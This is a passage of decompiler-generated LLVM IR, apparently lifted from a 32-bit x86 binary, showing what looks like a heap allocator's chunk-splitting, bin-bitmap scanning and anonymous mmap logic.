  %v2_8050ddf = inttoptr i32 %v1_8050ddf to i32*
  %v3_8050ddf = load i32, i32* %v2_8050ddf, align 4
  store i32 %v3_8050ddf, i32* @edx, align 4
  %v1_8050de2 = add i32 %v3_8050ddf, 12
  %v2_8050de2 = inttoptr i32 %v1_8050de2 to i32*
  %v3_8050de2 = load i32, i32* %v2_8050de2, align 4
  %v15_8050de2 = icmp eq i32 %v3_8050de2, %v4_8050de7
  %v1_8050de5 = icmp eq i1 %v15_8050de2, false
  br i1 %v1_8050de5, label %dec_label_pc_8050dec, label %dec_label_pc_8050de7

dec_label_pc_8050de7:                             ; preds = %dec_label_pc_8050ddf
  %v1_8050de7 = add i32 %v3_8050dd3, 8
  %v2_8050de7 = inttoptr i32 %v1_8050de7 to i32*
  %v3_8050de7 = load i32, i32* %v2_8050de7, align 4
  %v15_8050de7 = icmp eq i32 %v3_8050de7, %v4_8050de7
  br i1 %v15_8050de7, label %dec_label_pc_8050df1, label %dec_label_pc_8050dec

dec_label_pc_8050dec:                             ; preds = %dec_label_pc_8050de7, %dec_label_pc_8050ddf
  %v0_8050dec = call i32 @function_8051b1f()
  store i32 %v0_8050dec, i32* %eax.global-to-local, align 4
  %v0_8050df1.pre = load i32, i32* @ebx, align 4
  %v0_8050df7.pre = load i32, i32* @ecx, align 4
  %v1_8050df7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050df1

dec_label_pc_8050df1:                             ; preds = %dec_label_pc_8050de7, %dec_label_pc_8050dec
  %v1_8050df7 = phi i32 [ %v3_8050ddf, %dec_label_pc_8050de7 ], [ %v1_8050df7.pre, %dec_label_pc_8050dec ]
  %v0_8050df7 = phi i32 [ %v3_8050dd3, %dec_label_pc_8050de7 ], [ %v0_8050df7.pre, %dec_label_pc_8050dec ]
  %v0_8050df1 = phi i32 [ %v1_8050dd6, %dec_label_pc_8050de7 ], [ %v0_8050df1.pre, %dec_label_pc_8050dec ]
  %v5_8050df3 = sub i32 %v0_8050df1, %.v1_8050c13
  store i32 %v5_8050df3, i32* %esi.global-to-local, align 4
  %v2_8050df7 = add i32 %v1_8050df7, 12
  %v3_8050df7 = inttoptr i32 %v2_8050df7 to i32*
  store i32 %v0_8050df7, i32* %v3_8050df7, align 4
  %v0_8050dfa = load i32, i32* @edx, align 4
  %v1_8050dfa = load i32, i32* @ecx, align 4
  %v2_8050dfa = add i32 %v1_8050dfa, 8
  %v3_8050dfa = inttoptr i32 %v2_8050dfa to i32*
  store i32 %v0_8050dfa, i32* %v3_8050dfa, align 4
  %v0_8050dfd = load i32, i32* %esi.global-to-local, align 4
  %v0_8050e00 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e00 = add i32 %v0_8050e00, 8
  store i32 %v1_8050e00, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8050dfd, 16
  br i1 %tmp125, label %dec_label_pc_8051301, label %dec_label_pc_8050e09

dec_label_pc_8050e09:                             ; preds = %dec_label_pc_8050df1
  %v2_8050e0d = add i32 %v0_8050e00, %.v1_8050c13
  store i32 %v2_8050e0d, i32* @edx, align 4
  %v1_8050e10 = or i32 %.v1_8050c13, 1
  store i32 %v1_8050e10, i32* %ebx.global-to-local, align 4
  %v2_8050e13 = add i32 %v0_8050e00, 4
  %v3_8050e13 = inttoptr i32 %v2_8050e13 to i32*
  store i32 %v1_8050e10, i32* %v3_8050e13, align 4
  %v0_8050e16 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e18 = or i32 %v0_8050e16, 1
  store i32 %v1_8050e18, i32* %eax.global-to-local, align 4
  %v0_8050e1b = load i32, i32* @edx, align 4
  %v1_8050e1b = load i32, i32* @ebp, align 4
  %v2_8050e1b = add i32 %v1_8050e1b, 8
  %v3_8050e1b = inttoptr i32 %v2_8050e1b to i32*
  store i32 %v0_8050e1b, i32* %v3_8050e1b, align 4
  %v0_8050e1e = load i32, i32* @edx, align 4
  %v1_8050e1e = load i32, i32* @ebp, align 4
  %v2_8050e1e = add i32 %v1_8050e1e, 12
  %v3_8050e1e = inttoptr i32 %v2_8050e1e to i32*
  store i32 %v0_8050e1e, i32* %v3_8050e1e, align 4
  %v0_8050e21 = load i32, i32* @edx, align 4
  %v1_8050e21 = add i32 %v0_8050e21, 8
  %v2_8050e21 = inttoptr i32 %v1_8050e21 to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_8050e21, align 4
  %v0_8050e28 = load i32, i32* @edx, align 4
  %v1_8050e28 = add i32 %v0_8050e28, 12
  %v2_8050e28 = inttoptr i32 %v1_8050e28 to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_8050e28, align 4
  %v0_8050e2f = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e2f = load i32, i32* @edx, align 4
  %v2_8050e2f = add i32 %v1_8050e2f, 4
  %v3_8050e2f = inttoptr i32 %v2_8050e2f to i32*
  store i32 %v0_8050e2f, i32* %v3_8050e2f, align 4
  %v0_8050e32 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e32 = load i32, i32* @edx, align 4
  %v3_8050e32 = add i32 %v1_8050e32, %v0_8050e32
  %v4_8050e32 = inttoptr i32 %v3_8050e32 to i32*
  store i32 %v0_8050e32, i32* %v4_8050e32, align 4
  br label %dec_label_pc_8051306

dec_label_pc_8050e3c:                             ; preds = %dec_label_pc_8050dd0, %dec_label_pc_8050dc0
  %v4_8050de7 = phi i32 [ %storemerge1.pre, %dec_label_pc_8050dc0 ], [ %v3_8050dd3, %dec_label_pc_8050dd0 ]
  store i32 %v4_8050de7, i32* %eax.global-to-local, align 4
  %v12_8050e3c = icmp eq i32 %v4_8050de7, %v2_8050dc4
  %v1_8050e3e = icmp eq i1 %v12_8050e3c, false
  br i1 %v1_8050e3e, label %dec_label_pc_8050dd0, label %dec_label_pc_8050e40

dec_label_pc_8050e40:                             ; preds = %dec_label_pc_8050e3c, %dec_label_pc_8050db2
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8050e49 = add i32 %stack_var_-40.0.ph, 1
  %v2_8050e4c = udiv i32 %v1_8050e49, 32
  store i32 %v2_8050e4c, i32* @edi, align 4
  %v1_8050e4f = mul i32 %v1_8050e49, 8
  %v2_8050e4f = add i32 %v1_8050e4f, ptrtoint (i32* @global_var_805460c.34 to i32)
  store i32 %v2_8050e4f, i32* %ebx.global-to-local, align 4
  %v1_8050e56 = urem i32 %v1_8050e49, 32
  %v2_8050e56 = icmp eq i32 %v1_8050e56, 0
  store i32 %v1_8050e56, i32* %ecx.global-to-local, align 4
  %v1_8050e59 = mul nuw nsw i32 %v2_8050e4c, 4
  %v2_8050e59 = add i32 %v1_8050e59, ptrtoint (i32* @global_var_8054914.38 to i32)
  %v3_8050e59 = inttoptr i32 %v2_8050e59 to i32*
  %v4_8050e59 = load i32, i32* %v3_8050e59, align 4
  store i32 %v4_8050e59, i32* %edx.global-to-local, align 4
  br i1 %v2_8050e56, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8050e40
  %v5_8050e60 = shl i32 1, %v1_8050e56
  store i32 %v5_8050e60, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8050e40, %bb88, %dec_label_pc_8050ea1
  %v1_8050e62 = phi i32 [ %v1_8050e62.pre, %dec_label_pc_8050ea1 ], [ %v4_8050e59, %bb88 ], [ %v4_8050e59, %dec_label_pc_8050e40 ]
  %v0_8050e66 = phi i32 [ %v0_8050e62.pre, %dec_label_pc_8050ea1 ], [ %v5_8050e60, %bb88 ], [ 1, %dec_label_pc_8050e40 ]
  %tmp89 = icmp ule i32 %v0_8050e66, %v1_8050e62
  %v1_8050e66 = icmp eq i32 %v0_8050e66, 0
  %v1_8050e68 = icmp eq i1 %v1_8050e66, false
  %or.cond = and i1 %tmp89, %v1_8050e68
  br i1 %or.cond, label %dec_label_pc_8050e66.dec_label_pc_8050e96.preheader_crit_edge, label %dec_label_pc_8050e6a.preheader

dec_label_pc_8050e66.dec_label_pc_8050e96.preheader_crit_edge: ; preds = %.preheader
  %v0_8050e917.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e96.preheader

dec_label_pc_8050e6a.preheader:                   ; preds = %.preheader
  %v0_8050e6a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050e6a

dec_label_pc_8050e6a:                             ; preds = %dec_label_pc_8050e6a.preheader, %dec_label_pc_8050e74
  %v0_8050e6a = phi i32 [ %v0_8050e6a.pre, %dec_label_pc_8050e6a.preheader ], [ %v1_8050e6a, %dec_label_pc_8050e74 ]
  %v1_8050e6a = add i32 %v0_8050e6a, 1
  store i32 %v1_8050e6a, i32* @edi, align 4
  %v6_8050e6e = icmp ugt i32 %v1_8050e6a, 2
  br i1 %v6_8050e6e, label %dec_label_pc_8050f1d, label %dec_label_pc_8050e74

dec_label_pc_8050e74:                             ; preds = %dec_label_pc_8050e6a
  %v1_8050e74 = mul i32 %v1_8050e6a, 4
  %v2_8050e74 = add i32 %v1_8050e74, ptrtoint (i32* @global_var_8054914.38 to i32)
  %v3_8050e74 = inttoptr i32 %v2_8050e74 to i32*
  %v4_8050e74 = load i32, i32* %v3_8050e74, align 4
  store i32 %v4_8050e74, i32* %edx.global-to-local, align 4
  %v1_8050e7b = icmp eq i32 %v4_8050e74, 0
  br i1 %v1_8050e7b, label %dec_label_pc_8050e6a, label %dec_label_pc_8050e7f

dec_label_pc_8050e7f:                             ; preds = %dec_label_pc_8050e74
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8050e86 = mul i32 %v1_8050e6a, 256
  store i32 %v2_8050e86, i32* %eax.global-to-local, align 4
  %v1_8050e89 = add i32 %v2_8050e86, ptrtoint (i32* @global_var_805460c.34 to i32)
  store i32 %v1_8050e89, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e96.preheader

dec_label_pc_8050e96.preheader:                   ; preds = %dec_label_pc_8050e66.dec_label_pc_8050e96.preheader_crit_edge, %dec_label_pc_8050e7f
  %v0_8050e917 = phi i32 [ %v1_8050e89, %dec_label_pc_8050e7f ], [ %v0_8050e917.pre, %dec_label_pc_8050e66.dec_label_pc_8050e96.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8050e7f ], [ %v0_8050e66, %dec_label_pc_8050e66.dec_label_pc_8050e96.preheader_crit_edge ]
  %v0_8050ea8 = phi i32 [ %v4_8050e74, %dec_label_pc_8050e7f ], [ %v1_8050e62, %dec_label_pc_8050e66.dec_label_pc_8050e96.preheader_crit_edge ]
  %v2_8050e964 = and i32 %v0_8050ea8, %esi.promoted
  %v3_8050e965 = icmp eq i32 %v2_8050e964, 0
  br i1 %v3_8050e965, label %dec_label_pc_8050e91, label %dec_label_pc_8050e9a

dec_label_pc_8050e91:                             ; preds = %dec_label_pc_8050e96.preheader, %dec_label_pc_8050e91
  %v2_8050e9418 = phi i32 [ %v2_8050e94, %dec_label_pc_8050e91 ], [ %esi.promoted, %dec_label_pc_8050e96.preheader ]
  %v0_8050e918 = phi i32 [ %v1_8050e91, %dec_label_pc_8050e91 ], [ %v0_8050e917, %dec_label_pc_8050e96.preheader ]
  %v1_8050e91 = add i32 %v0_8050e918, 8
  %v2_8050e94 = mul i32 %v2_8050e9418, 2
  %v2_8050e96 = and i32 %v2_8050e94, %v0_8050ea8
  %v3_8050e96 = icmp eq i32 %v2_8050e96, 0
  br i1 %v3_8050e96, label %dec_label_pc_8050e91, label %dec_label_pc_8050e96.dec_label_pc_8050e9a_crit_edge

dec_label_pc_8050e96.dec_label_pc_8050e9a_crit_edge: ; preds = %dec_label_pc_8050e91
  store i32 %v1_8050e91, i32* %ebx.global-to-local, align 4
  store i32 %v2_8050e94, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050e9a

dec_label_pc_8050e9a:                             ; preds = %dec_label_pc_8050e96.dec_label_pc_8050e9a_crit_edge, %dec_label_pc_8050e96.preheader
  %v0_8050eaa = phi i32 [ %v2_8050e94, %dec_label_pc_8050e96.dec_label_pc_8050e9a_crit_edge ], [ %esi.promoted, %dec_label_pc_8050e96.preheader ]
  %v1_8050ec4 = phi i32 [ %v1_8050e91, %dec_label_pc_8050e96.dec_label_pc_8050e9a_crit_edge ], [ %v0_8050e917, %dec_label_pc_8050e96.preheader ]
  %v1_8050e9a = add i32 %v1_8050ec4, 12
  %v2_8050e9a = inttoptr i32 %v1_8050e9a to i32*
  %v3_8050e9a = load i32, i32* %v2_8050e9a, align 4
  store i32 %v3_8050e9a, i32* %ecx.global-to-local, align 4
  %v12_8050e9d = icmp eq i32 %v3_8050e9a, %v1_8050ec4
  %v1_8050e9f = icmp eq i1 %v12_8050e9d, false
  br i1 %v1_8050e9f, label %dec_label_pc_8050eb5, label %dec_label_pc_8050ea1

dec_label_pc_8050ea1:                             ; preds = %dec_label_pc_8050e9a
  %v1_8050ea3 = add i32 %v3_8050e9a, 8
  store i32 %v1_8050ea3, i32* %ebx.global-to-local, align 4
  %v1_8050ea6 = sub i32 -1, %v0_8050eaa
  store i32 %v1_8050ea6, i32* %eax.global-to-local, align 4
  %v2_8050ea8 = and i32 %v0_8050ea8, %v1_8050ea6
  store i32 %v2_8050ea8, i32* %edx.global-to-local, align 4
  %v2_8050eaa = mul i32 %v0_8050eaa, 2
  store i32 %v2_8050eaa, i32* %esi.global-to-local, align 4
  %v1_8050eac = load i32, i32* @edi, align 4
  %v2_8050eac = mul i32 %v1_8050eac, 4
  %v3_8050eac = add i32 %v2_8050eac, ptrtoint (i32* @global_var_8054914.38 to i32)
  %v4_8050eac = inttoptr i32 %v3_8050eac to i32*
  store i32 %v2_8050ea8, i32* %v4_8050eac, align 4
  %v0_8050e62.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e62.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050eb5:                             ; preds = %dec_label_pc_8050e9a
  %v1_8050eb5 = add i32 %v3_8050e9a, 4
  %v2_8050eb5 = inttoptr i32 %v1_8050eb5 to i32*
  %v3_8050eb5 = load i32, i32* %v2_8050eb5, align 4
  store i32 %v3_8050eb5, i32* %edx.global-to-local, align 4
  %v1_8050eb8 = add i32 %v3_8050e9a, 12
  %v2_8050eb8 = inttoptr i32 %v1_8050eb8 to i32*
  %v3_8050eb8 = load i32, i32* %v2_8050eb8, align 4
  store i32 %v3_8050eb8, i32* %eax.global-to-local, align 4
  %v1_8050ebb = and i32 %v3_8050eb5, -4
  store i32 %v1_8050ebb, i32* @edx, align 4
  %v5_8050ec0 = sub i32 %v1_8050ebb, %.v1_8050c13
  store i32 %v5_8050ec0, i32* %esi.global-to-local, align 4
  store i32 %v3_8050eb8, i32* %v2_8050e9a, align 4
  %v0_8050ec7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ec7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ec7 = add i32 %v1_8050ec7, 8
  %v3_8050ec7 = inttoptr i32 %v2_8050ec7 to i32*
  store i32 %v0_8050ec7, i32* %v3_8050ec7, align 4
  %v0_8050eca = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8050eca, 16
  br i1 %tmp126, label %dec_label_pc_8050ecf, label %dec_label_pc_8050ed6

dec_label_pc_8050ecf:                             ; preds = %dec_label_pc_8050eb5
  %v0_8050ecf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ecf = load i32, i32* @edx, align 4
  %v2_8050ecf = add i32 %v0_8050ecf, 4
  %v3_8050ecf = add i32 %v2_8050ecf, %v1_8050ecf
  %v4_8050ecf = inttoptr i32 %v3_8050ecf to i32*
  %v5_8050ecf = load i32, i32* %v4_8050ecf, align 4
  %v6_8050ecf = or i32 %v5_8050ecf, 1
  store i32 %v6_8050ecf, i32* %v4_8050ecf, align 4
  br label %dec_label_pc_8050f15

dec_label_pc_8050ed6:                             ; preds = %dec_label_pc_8050eb5
  store i32 %.v1_8050c13, i32* %eax.global-to-local, align 4
  %v0_8050edf = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050edf = add i32 %v0_8050edf, %.v1_8050c13
  store i32 %v2_8050edf, i32* @edx, align 4
  %v1_8050ee2 = load i32, i32* @ebp, align 4
  %v2_8050ee2 = add i32 %v1_8050ee2, 8
  %v3_8050ee2 = inttoptr i32 %v2_8050ee2 to i32*
  store i32 %v2_8050edf, i32* %v3_8050ee2, align 4
  %v0_8050ee5 = load i32, i32* @edx, align 4
  %v1_8050ee5 = load i32, i32* @ebp, align 4
  %v2_8050ee5 = add i32 %v1_8050ee5, 12
  %v3_8050ee5 = inttoptr i32 %v2_8050ee5 to i32*
  store i32 %v0_8050ee5, i32* %v3_8050ee5, align 4
  %v0_8050ee8 = load i32, i32* @edx, align 4
  %v1_8050ee8 = add i32 %v0_8050ee8, 8
  %v2_8050ee8 = inttoptr i32 %v1_8050ee8 to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_8050ee8, align 4
  %v0_8050eef = load i32, i32* @edx, align 4
  %v1_8050eef = add i32 %v0_8050eef, 12
  %v2_8050eef = inttoptr i32 %v1_8050eef to i32*
  store i32 ptrtoint (i32* @global_var_8054614.36 to i32), i32* %v2_8050eef, align 4
  br i1 %v6_8050c6b, label %dec_label_pc_8050efe, label %dec_label_pc_8050ef8

dec_label_pc_8050ef8:                             ; preds = %dec_label_pc_8050ed6
  %v0_8050ef8 = load i32, i32* @edx, align 4
  store i32 %v0_8050ef8, i32* @global_var_8054610.35, align 16
  br label %dec_label_pc_8050efe

dec_label_pc_8050efe:                             ; preds = %dec_label_pc_8050ed6, %dec_label_pc_8050ef8
  %v4_8050efe = or i32 %.v1_8050c13, 1
  %v0_8050f03 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050efe, i32* %ebx.global-to-local, align 4
  %v1_8050f09 = or i32 %v0_8050f03, 1
  store i32 %v1_8050f09, i32* %eax.global-to-local, align 4
  %v1_8050f0c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050f0c = add i32 %v1_8050f0c, 4
  %v3_8050f0c = inttoptr i32 %v2_8050f0c to i32*
  store i32 %v4_8050efe, i32* %v3_8050f0c, align 4
  %v0_8050f0f = load i32, i32* %esi.global-to-local, align 4
  %v1_8050f0f = load i32, i32* @edx, align 4
  %v3_8050f0f = add i32 %v1_8050f0f, %v0_8050f0f
  %v4_8050f0f = inttoptr i32 %v3_8050f0f to i32*
  store i32 %v0_8050f0f, i32* %v4_8050f0f, align 4
  %v0_8050f12 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f12 = load i32, i32* @edx, align 4
  %v2_8050f12 = add i32 %v1_8050f12, 4
  %v3_8050f12 = inttoptr i32 %v2_8050f12 to i32*
  store i32 %v0_8050f12, i32* %v3_8050f12, align 4
  br label %dec_label_pc_8050f15

dec_label_pc_8050f15:                             ; preds = %dec_label_pc_8050ecf, %dec_label_pc_8050efe
  %v0_8050f15 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050f15 = add i32 %v0_8050f15, 8
  store i32 %v1_8050f15, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051317

dec_label_pc_8050f1d:                             ; preds = %dec_label_pc_8050e6a, %dec_label_pc_8050c25, %dec_label_pc_8050c2d
  %v0_8050f1d = load i32, i32* @global_var_805460c.34, align 4
  store i32 %v0_8050f1d, i32* @ebx, align 4
  %v1_8050f27 = add i32 %.v1_8050c13, 16
  store i32 %v1_8050f27, i32* @esi, align 4
  %v1_8050f2a = add i32 %v0_8050f1d, 4
  %v2_8050f2a = inttoptr i32 %v1_8050f2a to i32*
  %v3_8050f2a = load i32, i32* %v2_8050f2a, align 4
  %v1_8050f31 = and i32 %v3_8050f2a, -4
  store i32 %v1_8050f31, i32* %ecx.global-to-local, align 4
  %v7_8050f34 = icmp ult i32 %v1_8050f31, %v1_8050f27
  br i1 %v7_8050f34, label %dec_label_pc_8050f54, label %dec_label_pc_8050f38

dec_label_pc_8050f38:                             ; preds = %dec_label_pc_8050f1d
  %v2_8050f3c = add i32 %v0_8050f1d, %.v1_8050c13
  store i32 %v2_8050f3c, i32* @edx, align 4
  %v1_8050f3f = or i32 %.v1_8050c13, 1
  store i32 %v1_8050f3f, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f3c, i32* @global_var_805460c.34, align 4
  store i32 %v1_8050f3f, i32* %v2_8050f2a, align 4
  %v0_8050f4b = load i32, i32* %ecx.global-to-local, align 4
  %v5_8050f4b = sub i32 %v0_8050f4b, %.v1_8050c13
  store i32 %v5_8050f4b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80512a7

dec_label_pc_8050f54:                             ; preds = %dec_label_pc_8050f1d
  %v0_8050f54 = load i32, i32* @global_var_805493c.39, align 4
  store i32 %v0_8050f54, i32* %edx.global-to-local, align 4
  %v0_8050f5a = load i8, i8* @global_var_80545e0.33, align 32
  %v1_8050f5a = and i8 %v0_8050f5a, 2
  %v2_8050f5a = icmp eq i8 %v1_8050f5a, 0
  br i1 %v2_8050f5a, label %dec_label_pc_8050f88, label %dec_label_pc_8050f63

dec_label_pc_8050f63:                             ; preds = %dec_label_pc_8050f54
  store i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8050f6b = call i32 @function_80517db(i32* bitcast (i8* @global_var_80545e0.33 to i32*))
  store i32 ptrtoint (i8* @global_var_80545e0.33 to i32), i32* @ebx, align 4
  %v1_8050f75 = add i32 %.v1_8050c13, -7
  store i32 %v1_8050f75, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f75, i32* %stack_var_-92, align 4
  %v1_8050f79 = call i32 @function_8050bbe(i32 %v1_8050f75)
  store i32 %v1_8050f79, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f79, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051317

dec_label_pc_8050f88:                             ; preds = %dec_label_pc_8050f54
  %v1_8050f88 = add i32 %v0_8050f54, -1
  store i32 %v1_8050f88, i32* @ecx, align 4
  store i32 %.v1_8050c13, i32* @ebx, align 4
  %v1_8050f93 = load i32, i32* @global_var_805492c.40, align 4
  %v7_8050f93 = icmp ult i32 %.v1_8050c13, %v1_8050f93
  br i1 %v7_8050f93, label %dec_label_pc_8051055, label %dec_label_pc_8050f9f

dec_label_pc_8050f9f:                             ; preds = %dec_label_pc_8050f88
  %v0_8050f9f = load i32, i32* @global_var_8054930.41, align 16
  store i32 %v0_8050f9f, i32* %eax.global-to-local, align 4
  %v1_8050fa4 = load i32, i32* @global_var_8054934.42, align 4
  %v5_8050faa = icmp slt i32 %v0_8050f9f, %v1_8050fa4
  br i1 %v5_8050faa, label %dec_label_pc_8050fb0, label %dec_label_pc_8051055

dec_label_pc_8050fb0:                             ; preds = %dec_label_pc_8050f9f
  %v2_8050fb2 = add i32 %.v1_8050c13, 10
  %v3_8050fb2 = add i32 %v2_8050fb2, %v0_8050f54
  %v1_8050fb6 = sub i32 0, %v0_8050f54
  store i32 %v1_8050fb6, i32* %eax.global-to-local, align 4
  %v2_8050fb8 = and i32 %v3_8050fb2, %v1_8050fb6
  store i32 %v2_8050fb8, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8050fb8, %.v1_8050c13
  br i1 %tmp127, label %dec_label_pc_8050fc4, label %dec_label_pc_8051055

dec_label_pc_8050fc4:                             ; preds = %dec_label_pc_8050fb0
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050fd1 = call i32 @function_8052400(i32 0, i32 %v2_8050fb8, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050f88, i32 %v1_8050f88)
  store i32 %v8_8050fd1, i32* %eax.global-to-local, align 4
  store i32 %v8_8050fd1, i32* @edx, align 4
  %v10_8050fdb = icmp eq i32 %v8_8050fd1, -1
  br i1 %v10_8050fdb, label %dec_label_pc_8050fc4.dec_label_pc_8051055_crit_edge, label %dec_label_pc_8050fe0

dec_label_pc_8050fc4.dec_label_pc_8051055_crit_edge: ; preds = %dec_label_pc_8050fc4
  %v0_8051055.pre = load i32, i32* @global_var_805460c.34, align 4
  br label %dec_label_pc_8051055

dec_label_pc_8050fe0:                             ; preds = %dec_label_pc_8050fc4
  %v1_8050fe2 = urem i32 %v8_8050fd1, 8
  %v2_8050fe2 = icmp eq i32 %v1_8050fe2, 0
  store i32 %v1_8050fe2, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050fe2, label %dec_label_pc_8050ffa, label %dec_label_pc_8050fe7

dec_label_pc_8050fe7:                             ; preds = %dec_label_pc_8050fe0
  %v0_8050fec = load i32, i32* @ebx, align 4
  %v2_8050fee = sub nsw i32 8, %v1_8050fe2
  store i32 %v2_8050fee, i32* %eax.global-to-local, align 4
  %v2_8050ff0 = add i32 %v2_8050fee, %v8_8050fd1
  store i32 %v2_8050ff0, i32* @edx, align 4
  %v2_8050ff2 = sub i32 %v0_8050fec, %v2_8050fee
  store i32 %v2_8050ff2, i32* %esi.global-to-local, align 4
  %v2_8050ff4 = inttoptr i32 %v2_8050ff0 to i32*
  store i32 %v2_8050fee, i32* %v2_8050ff4, align 4
  br label %dec_label_pc_8051002

dec_label_pc_8050ffa:                             ; preds = %dec_label_pc_8050fe0
  %v1_8050ffa = inttoptr i32 %v8_8050fd1 to i32*
  store i32 0, i32* %v1_8050ffa, align 4
  br label %dec_label_pc_8051002

dec_label_pc_8051002:                             ; preds = %dec_label_pc_8050fe7, %dec_label_pc_8050ffa
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050fe7 ], [ @ebx, %dec_label_pc_8050ffa ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8051002 = or i32 %storemerge, 2
  %v1_8051005 = load i32, i32* @edx, align 4
  %v2_8051005 = add i32 %v1_8051005, 4
  %v3_8051005 = inttoptr i32 %v2_8051005 to i32*
  store i32 %v1_8051002, i32* %v3_8051005, align 4
  %v0_8051008 = load i32, i32* @global_var_8054930.41, align 16
  %v1_805100d = add i32 %v0_8051008, 1
  store i32 %v1_805100d, i32* %eax.global-to-local, align 4
  store i32 %v1_805100d, i32* @global_var_8054930.41, align 16
  %v1_8051013 = load i32, i32* @global_var_8054938.43, align 8
  %v7_8051019 = icmp sgt i32 %v1_805100d, %v1_8051013
  br i1 %v7_8051019, label %dec_label_pc_805101b, label %dec_label_pc_8051020

dec_label_pc_805101b:                             ; preds = %dec_label_pc_8051002
  store i32 %v1_805100d, i32* @global_var_8054938.43, align 8
  br label %dec_label_pc_8051020

dec_label_pc_8051020:                             ; preds = %dec_label_pc_8051002, %dec_label_pc_805101b
  %v0_8051020 = load i32, i32* @global_var_8054944.44, align 4
  %v1_8051025 = load i32, i32* @ebx, align 4
  %v2_8051025 = add i32 %v1_8051025, %v0_8051020
  store i32 %v2_8051025, i32* %eax.global-to-local, align 4
  store i32 %v2_8051025, i32* @global_var_8054944.44, align 4
  %v1_805102c = load i32, i32* @global_var_8054950.45, align 16
  %tmp128 = icmp ugt i32 %v2_8051025, %v1_805102c
  br i1 %tmp128, label %dec_label_pc_8051034, label %dec_label_pc_8051039

dec_label_pc_8051034:                             ; preds = %dec_label_pc_8051020
  store i32 %v2_8051025, i32* @global_var_8054950.45, align 16
  br label %dec_label_pc_8051039

dec_label_pc_8051039:                             ; preds = %dec_label_pc_8051020, %dec_label_pc_8051034
  %v1_8051039 = load i32, i32* @global_var_8054948.46, align 8
  %v2_8051039 = add i32 %v1_8051039, %v2_8051025
  store i32 %v2_8051039, i32* %eax.global-to-local, align 4
  %v1_805103f = load i32, i32* @global_var_8054954.47, align 4
  %tmp129 = icmp ugt i32 %v2_8051039, %v1_805103f
  br i1 %tmp129, label %dec_label_pc_805104b, label %dec_label_pc_8050c9c

dec_label_pc_805104b:                             ; preds = %dec_label_pc_8051039
  store i32 %v2_8051039, i32* @global_var_8054954.47, align 4
  br label %dec_label_pc_8050c9c

dec_label_pc_8051055:                             ; preds = %dec_label_pc_8050fb0, %dec_label_pc_8050fc4.dec_label_pc_8051055_crit_edge, %dec_label_pc_8050f9f, %dec_label_pc_8050f88
  %v0_8051055 = phi i32 [ %v0_8051055.pre, %dec_label_pc_8050fc4.dec_label_pc_8051055_crit_edge ], [ %v0_8050f1d, %dec_label_pc_8050f9f ], [ %v0_8050f1d, %dec_label_pc_8050fb0 ], [ %v0_8050f1d, %dec_label_pc_8050f88 ]
  store i32 %v0_8051055, i32* %eax.global-to-local, align 4
  %v1_805105e = add i32 %v0_8051055, 4
  %v2_805105e = inttoptr i32 %v1_805105e to i32*
  %v3_805105e = load i32, i32* %v2_805105e, align 4
  %v1_8051068 = and i32 %v3_805105e, -4
  %v2_8051068 = icmp eq i32 %v1_8051068, 0
  store i32 %v1_8051068, i32* @ebp, align 4
  %v1_805106b = load i32, i32* @global_var_8054928.48, align 8
  %v2_805106b = add i32 %v1_805106b, %v1_8050f27
  store i32 %v2_805106b, i32* %eax.global-to-local, align 4
  %v0_8051071 = load i8, i8* @global_var_8054940.49, align 64
  %v1_8051071 = urem i8 %v0_8051071, 2
  %v2_8051071 = icmp eq i8 %v1_8051071, 0
  br i1 %v2_8051071, label %dec_label_pc_805107c, label %dec_label_pc_805107a

dec_label_pc_805107a:                             ; preds = %dec_label_pc_8051055
  %v2_805107a = sub i32 %v2_805106b, %v1_8051068
  store i32 %v2_805107a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805107c

dec_label_pc_805107c:                             ; preds = %dec_label_pc_8051055, %dec_label_pc_805107a
  %v0_8051080 = phi i32 [ %v2_805106b, %dec_label_pc_8051055 ], [ %v2_805107a, %dec_label_pc_805107a ]
  %v5_8051080 = add i32 %v0_8051080, %v1_8050f88
